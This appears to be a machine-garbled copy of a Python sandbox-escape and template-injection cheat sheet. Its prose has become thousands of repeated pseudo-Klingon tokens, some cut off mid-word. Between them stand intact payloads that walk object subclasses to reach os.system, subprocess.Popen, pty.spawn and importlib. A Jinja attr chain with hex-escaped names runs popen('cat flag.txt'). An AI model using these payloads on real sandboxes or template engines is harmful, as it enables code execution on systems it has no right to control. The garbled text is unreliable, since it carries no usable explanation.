**ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **gh
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### qo'wI' 'e' yIbuS 'ej qay'be'pu' 'e' yIbuS

mIw **`sys`** **ghItlh** **import arbitrary libraries** **'e' vItlhutlh** **modules loaded** **'e' vItlhutlh** **sys** **'e' **import** **'e' vItlhutlh** **modules** **'e'** **search** **'e'** **jImej**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
**ghItlh** **'ej** ***wa'*** **jatlhqa'** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
**tlhIngan Hol:**

**ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
